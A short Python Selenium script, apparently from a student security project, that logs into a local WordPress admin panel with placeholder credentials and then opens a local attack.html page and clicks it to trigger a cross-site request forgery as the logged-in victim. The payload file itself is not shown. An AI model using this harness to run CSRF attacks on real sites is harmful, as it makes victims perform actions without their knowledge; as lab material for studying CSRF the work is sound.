#exploit program

from selenium import webdriver
from selenium.webdriver.common.keys import Keys

#user has already to be logged in the website
driver = webdriver.Firefox()
#visit website
driver.get("http://127.0.0.1/wp/wp-admin")

#insert username and password
username_field = driver.find_element_by_id("user_login")
username_field.send_keys("admin")

password_field = driver.find_element_by_id("user_pass")
password_field.send_keys("pass")

#log in
driver.find_element_by_id("wp-submit").click()

#admin is logged in to the website

#begin of the attack

#open the malicious HTML file
# // modify location of the folder where attack.html file is saved //
driver.get("file:///home/chiara/github/InformationSecurityProject/csrf%20exploit/attack.html")

#after clicking on the page, the malicious code is executed and the
#harmful actions are performed by victim without him knowing
malicious_click = driver.find_element_by_id("attack_div")
malicious_click.click()

#redirection to homepage
driver.get("http://127.0.0.1/wp/wp-admin")

#end of the attack
